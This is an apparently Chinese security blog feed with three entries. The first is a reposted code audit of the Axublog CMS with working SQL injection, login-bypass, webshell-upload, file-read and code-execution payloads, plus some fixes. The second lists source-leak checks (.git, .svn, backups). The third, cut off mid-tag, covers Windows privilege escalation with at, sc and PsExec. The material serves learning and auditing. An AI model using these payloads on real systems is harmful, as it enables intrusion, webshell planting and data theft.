        <content type="html"><![CDATA[<h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><p><strong>转载自：</strong><a href="https://www.cnblogs.com/v01cano/p/12416366.html" target="_blank" rel="noopener">https://www.cnblogs.com/v01cano/p/12416366.html</a></p><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p><pre><code>&lt;?phpheader(&quot;Content-type:text/html; charset=utf-8&quot;);require(&quot;cmsconfig.php&quot;);require(&quot;class/c_other.php&quot;);sqlguolv();$g=$_GET[&#39;g&#39;];if ($g==&#39;arthit&#39;){$id=$_GET[&#39;id&#39;];            if($id!=&#39;&#39;){$tab=$tabhead.&quot;arts&quot;;mysql_select_db($tab);$sql=mysql_query(&quot;UPDATE &quot;.$tab.&quot; SET hit=hit+1 where id=&quot;.$id);  //直接将$_GET[&#39;id&#39;]提取的                                                                      id带入sql查询，没有经过                                                                      有效过滤$sql = mysql_query(&quot;select * from &quot;.$tab.&quot; where id=&quot;.$id);$row=mysql_fetch_array($sql);    $str=$row[&#39;hit&#39;];    echo &#39;document.write(&#39;.$str.&#39;);&#39;;    }}</code></pre><p>我们尝试直接传入payload尝试：</p><pre><code>/hit/php?g=archit&amp;id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12</code></pre><p>发现被拦截。</p><p>我们发现在get传参之前，有一个过滤函数。</p><pre><code>if(sqlguolv()==1){die(&#39;禁止输入特殊符号和非法访问！&#39;);}</code></pre><p>我们找到这个函数：位于axublog\class\c_other.php:690行</p><pre><code>Function sqlguolv() {@header(&quot;Content-type:text/html; charset=utf-8&quot;);$a=&#39;/%3C|\&lt;|%27|%22|\&gt;|%3E|\||\\\|\;|select|insert|\&quot;|\&#39;|\\*|\*|union|into/i&#39;;if(preg_match($a,$_SERVER[&#39;QUERY_STRING&#39;])==11 or preg_match($a,file_get_contents(&quot;php://input&quot;))==11 ){return &quot;1&quot;;}}</code></pre><p>_SERVER[‘QUERY_STRING’]获取查询语句，一般是问号后面的字符串，然后使用preg_match()函数来匹配正则表达式。但是有一个问题：</p><p>使用$_SERVER[‘QUERY_STRING’]不会对传入的字符进行URL解码操作，</p><p>而$_GET时候会进行一次URL解码。所以我们可以使用url编码的方式绕过检测。</p><p>我们可以分别对字母u和s进行url编码为：%75 %73，得到paylaod:</p><pre><code>?g=arthit&amp;id=-1%20%75nion%20%73elect%201,2,3,4,5,6,database(),8,9,10,11,12</code></pre><h5 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h5><p>1.加强sqlguolv()的功能，针对 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不对URL进行解码的问题进行修复，即增加解码的步骤并完善正则匹配的关键字。</p><pre><code>$_SERVER[&#39;QUERY_STRING&#39;]=urldecode($_SERVER[&#39;QUERY_STRING&#39;]);</code></pre><p>2.因为此次的sql注入为数字型，所以可以直接将id进行强制转换为int型在进行查询。</p><pre><code>$id=intval($id);</code></pre><p>3.使用预编译技术和数据库进行交互。</p><h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><h5 id="漏洞位置："><a href="#漏洞位置：" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/theme.php  185~198行</p><h5 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>分析漏洞代码：</p><pre><code>&lt;?php@$g=$_GET[&quot;g&quot;];?&gt;&lt;script src=&quot;jspost.js&quot;&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;?php    switch ($g)    {    default:index();break;     case &quot;index&quot;:index();break;     case &quot;savechoose&quot;:savechoose();break;     case &quot;edit&quot;:edit();break;         case &quot;edit2&quot;:edit2();break;         case &quot;edit2save&quot;:edit2save();break;     }</code></pre><p>当我们传入<code>?g=edit2save</code>即可调用edit2save()的函数。</p><p>我们继续观察该函数功能：</p><pre><code>&lt;?php function edit2save(){global $themepath;?&gt;&lt;div class=&quot;yj_green&quot; id=full&gt;&lt;b class=&quot;b1&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b4&quot;&gt;&lt;/b&gt;&lt;div class=&quot;boxcontent&quot;&gt;&lt;h2&gt;&lt;a href=&quot;?&quot;&gt;主题管理&lt;/a&gt; &gt; &lt;a href=&quot;javascript:history.go(-2)&quot;&gt;编辑主题&lt;/a&gt; &gt; 编辑文件 &gt; &lt;a href=&quot;javascript:history.back()&quot;&gt;返回&lt;/a&gt;&lt;/h2&gt;&lt;/div&gt;&lt;div class=&quot;t1&quot;&gt;&lt;div class=&quot;t2&quot;&gt;&lt;?php$path=$_REQUEST[&#39;path&#39;];$content=stripslashes($_REQUEST[&#39;content&#39;]);?&gt;&lt;p&gt;编辑文件：&lt;?=$path?&gt;&lt;/p&gt;&lt;?phpif($path==&#39;&#39;){echo&#39;文件路径错误！&#39;;exit;}if(file_put_contents ($path, $content)){echo&quot;保存文件成功！&quot;;} else{echo&quot;保存文件失败！&quot;;}?&gt;</code></pre><p>​    在这个方法中，$path和$content分别表示路径和文件内容，用户可控，最后把这两个参数传入file_put_contents中进行保存操作。</p><p>我们可以构造写入webshell的payload:</p><pre><code>?g=edit2save&amp;path=../shell.php&amp;content=&lt;?php%20@eval($_POST[cmd]);?&gt;</code></pre><p>成功拿到webshell.</p><h5 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h5><p>我们根据上下函数可知，此处调用该函数的目的是为了about页面：</p><p>所以我们可以对path进行白名单校验，或者直接将路径写死：</p><pre><code>if($path!=&#39;../theme/default/about.mb&#39;){    echo &#39;about.mb地址不正确&#39;;    exit;}</code></pre><h3 id="后台生成about页面getshell"><a href="#后台生成about页面getshell" class="headerlink" title="后台生成about页面getshell"></a>后台生成about页面getshell</h3><h5 id="漏洞位置：-1"><a href="#漏洞位置：-1" class="headerlink" title="漏洞位置："></a>漏洞位置：</h5><p>/ad/html.php 773行~787行</p><h5 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><pre><code>ob_start();include($mb);$html = ob_get_contents ();ob_clean();$html=mbreplace($html);file_put_contents ($cache, $html);echo &#39;生成about.html成功: &lt;a target=blank href=&quot;&#39;.$cache.&#39;&quot;&gt;访问&lt;/a&gt;&#39;;?&gt;&lt;/div&gt;&lt;/div&gt;&lt;b class=&quot;b4b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b3b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b2b&quot;&gt;&lt;/b&gt;&lt;b class=&quot;b1b&quot;&gt;&lt;/b&gt;&lt;/div&gt;&lt;?php}?&gt;</code></pre><p>这里使用include函数包含about.mb将其中php的语句执行后再将一些标签替换成变量的值，最后把处理的结果放入<code>$cache</code>变量中再将其写入<code>aout.html</code>页面。</p><p>我们在about.mb尾部添加如下代码：</p><pre><code>&lt;?php file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php @eval($_GET[&quot;a&quot;]); ?&gt;&#39;); ?&gt;</code></pre><p>然后使用菜刀连接即可getshell。</p><h4 id="后台登录处的sql注入漏洞"><a href="#后台登录处的sql注入漏洞" class="headerlink" title="后台登录处的sql注入漏洞"></a>后台登录处的sql注入漏洞</h4><h5 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>首先分析其login.php页面，发现用户名和密码输入后是使用的jsloginpost函数进行处理的。jsloginpost函数是在c_login.php文件中定义的。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303210401433-2074327058.png" alt="img"></p><p>打开c_login.php页面，分析jsloginpost代码，发现jsloginpost并没有对user和psw进行过滤处理，而是直接带入了sql语句进行查询，所以此处造成了sql注入漏洞。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211200124-595595133.png" alt="img"></p><h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>我们只需要在后台管理员登录处使用万能密码即可成功登录，例如</p><pre><code>user:admin&#39; or 1=1#psw: 随意或者user: admin&#39; or 1#psw: 随意</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303211645255-577074129.png" alt="img"></p><h4 id="前台反射型xss漏洞"><a href="#前台反射型xss漏洞" class="headerlink" title="前台反射型xss漏洞"></a>前台反射型xss漏洞</h4><h5 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>此漏洞是搜索功能处的xss漏洞，由于在search.php中对word参数没有过滤而产生的。首先分析search.php文件，在文件中首先获取搜索数据给word参数，然后进行判断，如果没有传参数，则直接调用index()函数，如果传递了参数则调用so()函数。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303232615102-565416911.png" alt="img"></p><p>进入so()函数继续分析：在so()函数中也没有对word参数进行任何过滤处理，而是包含了一个模板文件search.mb，继续跟进模板文件：</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234054140-229902481.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303233948167-467235758.png" alt="img"></p><p>模板文件search.mb分析：发现在模板文件中也是直接对word参数直接输出，而没有任何过滤，所以此处就造成了xss漏洞</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234320733-213715566.png" alt="img"></p><h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234506377-737313316.png" alt="img"></p><h4 id="前台sql注入漏洞"><a href="#前台sql注入漏洞" class="headerlink" title="前台sql注入漏洞"></a>前台sql注入漏洞</h4><p>在第二个分析xss漏洞的过程中发现，在其模板文件search.mb中还调用了searchlist()函数，继续跟进searchlist()函数（searchlist函数在search.php文件中）</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200303234835707-2141296773.png" alt="img"></p><p>发现在searchlist()函数中同样没有对word参数进行过滤，而直接带入了sql语句进行查询，所以此处就造成了sql注入漏洞。</p><p>漏洞利用：</p><pre><code>执行如下poc时候返回正确结果：http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=1--+执行如下poc时候无结果返回：http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p><p>漏洞点：admin/theme.php</p><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5C1587018-20200304002821492-309441952.png" alt=""></p><p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p><p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003116729-1307171520.png" alt="img"></p><h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>请求：http://192.168.110.152/axublog/admin/theme.php?g=edit2savepost:path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003256803-1334544380.png" alt="img"></p><h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p><p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172222897-1426655107.png" alt="img"></p><p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172533350-1121177041.png" alt="img"></p><p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p><p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172752867-937007122.png" alt="img"></p><h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>poc:http://192.168.110.152/axublog/admin/admin.php?g=edit&amp;id=1 union select 1,version(),3,4--+Referer: 任意填写</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172922428-724640530.png" alt="img"></p><p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p><h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p><p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304173840167-1365630191.png" alt="img"></p><p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174437952-1224821444.png" alt="img"></p><p>漏洞利用：</p><pre><code>poc:http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174618584-506013891.png" alt="">代码执行漏洞</h4><p>漏洞点：admin/html.php</p><p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304210913536-1220729563.png" alt="img"></p><p>漏洞利用：</p><p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211607584-434322337.png" alt="img"></p><p>保存编辑后选择生成about：</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211905560-277463672.png" alt="img"></p><p>然后我们的代码就被成功的执行了，访问shell2.php:</p><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304212324112-1387100175.png" alt="img"></p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p><p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Axublog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>敏感信息泄露常见类型</title>
      <link href="/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/"/>
      <url>/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p><h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p><ul><li>所有该项目的源码</li><li>私有仓库的地址</li><li>私密的配置信息。</li><li>所有commiter的邮箱账号信息</li><li>内部的账号和密码。。</li></ul><p><strong>检测方式：</strong>   工具：GitHack  使用方法：</p><p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p><p><strong>示例：</strong>来源(i春秋web Hello world);</p><p>进入题目，查看源码，只发现一个js文件</p><img src="QQ截图20200119121609.png" style="zoom:50%;" /><p>我们尝试使用Githack来判断网站是否有.git泄露。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt=""></p><p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p><img src="QQ截图20200119121116.png" style="zoom:50%;" /><h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p><p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p><h4 id="3、DS-Store源码泄露漏洞"><a href="#3、DS-Store源码泄露漏洞" class="headerlink" title="3、DS_Store源码泄露漏洞"></a>3、DS_Store源码泄露漏洞</h4><p><strong>漏洞描述：</strong>在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p><p><strong>检测方式：</strong>dsstoreexp,使用方式：<code>python ds_store_exp.py http://域名/.Ds.store</code></p><h4 id="4、robots导致文件泄露"><a href="#4、robots导致文件泄露" class="headerlink" title="4、robots导致文件泄露"></a>4、robots导致文件泄露</h4><p><strong>漏洞描述：</strong>搜索引擎可以通过robots文件获知哪些页面可以爬取，哪些页面不可以爬取。Robots协议是网站国际互联网通行的道德规范。其目的是保护网站数据和明杆信息 、确保用户个人信息和隐私不被侵犯，如果robots.txt文件太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p><p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p><p>​                   2.直接在网站URL输入/robots.txt进行查看。</p><p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p><p>​       <img src="QQ截图20200119110404.png" style="zoom: 80%;" /></p><p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p><img src="QQ截图20200119110727.png" style="zoom:80%;" /><p>​                 </p><h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p><pre><code>*.rar    *.zip   *.7z   *.tar.gz   *.bak   *.swp   *.txt   *.html</code></pre><p>​                   或者使用工具比如AWVS进行扫描。</p><p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p><h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p><img src="sec_hole_13.png" style="zoom:67%;" /><p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p><p><strong>修复方案 ：</strong>删除该PHP文件。</p><h4 id="7、SVN文件泄露漏洞"><a href="#7、SVN文件泄露漏洞" class="headerlink" title="7、SVN文件泄露漏洞"></a>7、SVN文件泄露漏洞</h4><p><strong>漏洞描述：</strong>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p><strong>漏洞检测：</strong> </p><p>1.漏洞利用工具： Seay SVN漏洞利用工具</p><p>2、添加网站url</p><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p><p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p><p>m’g</p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 敏感信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——提权</title>
      <link href="/2020/04/03/shen-tou-ce-shi-ti-quan/"/>
      <url>/2020/04/03/shen-tou-ce-shi-ti-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试——提权部分知识"><a href="#渗透测试——提权部分知识" class="headerlink" title="渗透测试——提权部分知识"></a>渗透测试——提权部分知识</h2><h3 id="提权——本地提权"><a href="#提权——本地提权" class="headerlink" title="提权——本地提权"></a>提权——本地提权</h3><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获得更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登录时获取权限令牌</li><li>服务账号无需用户登录已在后台启动服务</li></ul></li><li>Windows<ul><li>users</li><li>Administrator</li><li>System</li></ul></li><li>Linux<ul><li>User</li><li>Root</li></ul></li></ul><h4 id="1-Windows系统提权"><a href="#1-Windows系统提权" class="headerlink" title="1.Windows系统提权"></a>1.Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin * C:\Documents and Settings\kevin&gt;net user kevin *     Type a password for the user:     Retype the password to confirm:     The command completed successfully. # 查看系统用户：net user C:\Documents and Settings\kevin&gt;net user     User accounts for \\DH-CA8822AB9589     ---------------------------------------------------------------------     Administrator            Guest                    HelpAssistant     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin     SUPPORT_388945a0     The command completed successfully. # 查看用户状态： C:\Documents and Settings\kevin&gt;net user kevin     User name                    kevin     Full Name                    kevin     Comment     User&#39;s comment     Country code                 000 (System Default)     Account active               Yes     Account expires              Never     Password last set            2/28/2018 2:05 PM     Password expires             Never     Password changeable          2/28/2018 2:05 PM     Password required            Yes     User may change password     Yes     Workstations allowed         All     Logon script     User profile     Home directory     Last logon                   2/28/2018 2:03 PM     Logon hours allowed          All     Local Group Memberships      *Administrators       *Users     Global Group memberships     *None     The command completed successfully.</code></pre><p>1.查看用户进程</p><p> <img src="https://img-blog.csdn.net/20180228141004062?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>2.将 kevin 用户权限提升为 system 权限</p><pre><code>  C:\Documents and Settings\kevin&gt;cd \  C:\&gt;at -?  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间      Added a new job with job ID = 1  C:\&gt;at  Status ID   Day                     Time          Command Line  ---------------------------------------------------------------------          1   Today                     2:15 AM       cmd</code></pre><p><img src="https://img-blog.csdn.net/20180228142729494?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvS2V2aW5oYW5zZXI=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>3.用新的 system 权限的窗口启动任务管理器</p><pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭explorer</p><p><img src="https://img-blog.csdnimg.cn/2019041316500887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>5.应用程序-&gt;新任务-&gt;explorer</p><p><img src="https://img-blog.csdnimg.cn/20190413165013914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>6.验证桌面用户权限</p><p><img src="https://img-blog.csdnimg.cn/20190413165019827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p><p><img src="https://img-blog.csdnimg.cn/2019041316502652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>C:\Documents and Settings\kevin&gt;cd</li><li>C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact</li><li>C:&gt;sc start syscmd</li></ul><p>3.使用 Sysinternals Suite 套件</p><p>推荐书籍 《Windows Internals第7版》</p><p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p><ul><li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p><p><img src="https://img-blog.csdnimg.cn/20190413165034700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>启动 PsExec.exe</p></li></ul><pre><code>  C:\&gt;PsExec.exe  -i: 交互模式  -s: 使用系统账户  C:\&gt;psexec -p&#39;sei -s -d taskmgr  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul><li>提权结果</li></ul><p><img 